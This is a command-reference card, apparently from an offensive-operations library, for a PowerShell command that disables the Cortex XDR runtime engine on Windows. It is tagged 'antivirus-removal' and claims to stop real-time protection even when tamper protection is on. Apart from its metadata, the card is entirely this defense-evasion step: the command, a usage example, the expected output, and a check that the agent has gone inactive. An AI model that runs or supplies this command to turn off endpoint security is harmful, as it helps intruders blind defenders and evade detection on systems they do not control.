---
id: 28e4bce0-220f-4b36-bf1c-ca7928d0a285
name: cytool-disable-runtime
type: command
executor: powershell
data: cytool.exe runtime disable
output: null
created_at: '2023-04-06T03:56:27.633180+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - antivirus-removal
  - runtime-disable
verified: true
validated: true
---

# cytool-disable-runtime

## Command

```powershell
cytool.exe runtime disable
```

## Description

Disables the Cortex XDR runtime engine, stopping real-time protection even with tamper protection enabled.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Standard disable command | No |

## Examples

### Basic Usage

```powershell
cytool.exe runtime disable
```

## Expected Output

```
Runtime disabled successfully.
```

Agent no longer scans or blocks; check processes for inactivity.

## Related

- [[procedures/disable-elastic-agent-and-cortex-xdr-on-windows]]
